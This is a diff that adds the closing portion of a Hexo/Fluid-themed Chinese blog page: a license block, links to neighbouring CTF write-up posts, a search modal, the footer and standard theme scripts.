+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/11/2024ciscnFinal/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/10/2024-CISCN-SouthEast-Web/" title="2024-CISCN-SouthEast-Web">
+                        <span class="hidden-mobile">2024-CISCN-SouthEast-Web</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
